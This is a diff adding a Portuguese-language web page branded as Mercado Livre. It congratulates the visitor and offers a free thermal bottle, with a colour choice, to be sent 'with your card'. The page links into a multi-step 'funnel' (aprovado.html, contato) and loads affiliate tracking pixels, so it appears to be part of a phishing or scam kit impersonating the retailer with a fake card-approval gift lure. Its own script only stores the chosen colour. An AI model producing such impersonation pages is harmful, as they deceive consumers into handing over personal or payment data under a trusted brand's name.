@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercado Livre - Brinde</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <script src="js/utmify-tracker.js"></script>
+    <script src="js/utmify-pixel-tiktok.js"></script>
+    <script src="js/tiktok-pixel-shop.js"></script>
+    <style>
+        .g-wrap {
+            background: #f5f5f5;
+            min-height: calc(100vh - 56px);
+            padding: 20px 16px 32px;
+        }
+
+        .g-card {
+            background: #fff;
+            border-radius: 16px;
+            padding: 24px 18px 28px;
+            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.06);
+        }
+
+        .g-title {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 800;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
+
+        .g-sub {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            line-height: 1.45;
+            margin-bottom: 22px;
+        }
+
+        .g-img {
+            width: 100%;
+            height: 260px;
+            background: #eee;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .g-img img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        .color-picker {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 14px;
+        }
+
+        .color-option {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border: 3px solid transparent;
+            cursor: pointer;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .color-option.active {
+            border-color: #3483fa;
+            transform: scale(1.08);
+        }
+
+        .c-black {
+            background: #222;
+        }
+
+        .c-pink {
+            background: #ffb6c1;
+        }
+
+        .c-white {
+            background: #fff;
+            border: 1px solid #ccc;
+        }
+
+        .g-chosen {
+            text-align: center;
+            font-weight: 600;
+            font-size: 15px;
+            color: #1a1a1a;
+            margin-bottom: 16px;
+        }
+
+        .gift-notice {
+            background: #fffde6;
+            border: 1px solid #ffe600;
+            padding: 14px 12px;
+            border-radius: 10px;
+            font-size: 13px;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            line-height: 1.4;
+            margin-bottom: 22px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="app-container app-container--funnel">
+        <header>
+            <a href="aprovado.html" class="header-back" aria-label="Voltar">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                    <path d="M15 18L9 12L15 6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"
+                        stroke-linejoin="round"></path>
+                </svg>
+            </a>
+            <div class="header-logo">
+                <img src="images/Mercado-Livre-logo.png" alt="Mercado Livre" width="150" height="36">
+            </div>
+        </header>
+
+        <div class="g-wrap">
+            <div class="g-card">
+                <h1 class="g-title">Para começarmos bem nossa relação</h1>
+                <p class="g-sub">Como presente de boas-vindas, vamos enviar gratuitamente junto do seu cartão uma
+                    garrafa térmica de 1,2L. Escolha a sua cor:</p>
+
+                <div class="g-img" id="gImg">
+                    <img id="gImgEl" src="images/garrafas.png" alt="Garrafa térmica promocional">
+                </div>
+
+                <div class="color-picker">
+                    <div class="color-option c-black active" data-cor="Preto" role="button" tabindex="0"
+                        aria-pressed="true" onclick="setCorBrinde('Preto', this)"></div>
+                    <div class="color-option c-pink" data-cor="Rosa" role="button" tabindex="0"
+                        onclick="setCorBrinde('Rosa', this)"></div>
+                    <div class="color-option c-white" data-cor="Branco" role="button" tabindex="0"
+                        onclick="setCorBrinde('Branco', this)"></div>
+                </div>
+
+                <p class="g-chosen">Cor escolhida: <span id="giftColorName">Preto</span></p>
+
+                <div class="gift-notice">
+                    <span style="font-size: 20px; flex-shrink: 0;" aria-hidden="true">🎁</span>
+                    <span>Esse brinde é um presente para novos clientes. Obrigado por confiar no Mercado Livre.</span>
+                </div>
+
+                <a href="../contato/index.html" class="btn btn-yellow">Continuar</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function setCorBrinde(nome, el) {
+            document.querySelectorAll(".color-option").forEach(function (c) {
+                c.classList.remove("active");
+                c.setAttribute("aria-pressed", "false");
+            });
+            el.classList.add("active");
+            el.setAttribute("aria-pressed", "true");
+            document.getElementById("giftColorName").textContent = nome;
+            try {
+                sessionStorage.setItem("mlBrindeCor", nome);
+            } catch (e) { }
+        }
+
+        try {
+            var saved = sessionStorage.getItem("mlBrindeCor");
+            if (saved) {
+                var op = document.querySelector('.color-option[data-cor="' + saved + '"]');
+                if (op) setCorBrinde(saved, op);
+            } else {
+                sessionStorage.setItem("mlBrindeCor", "Preto");
+            }
+        } catch (e) { }
+    </script>
+
+
+</body>
+
+</html>
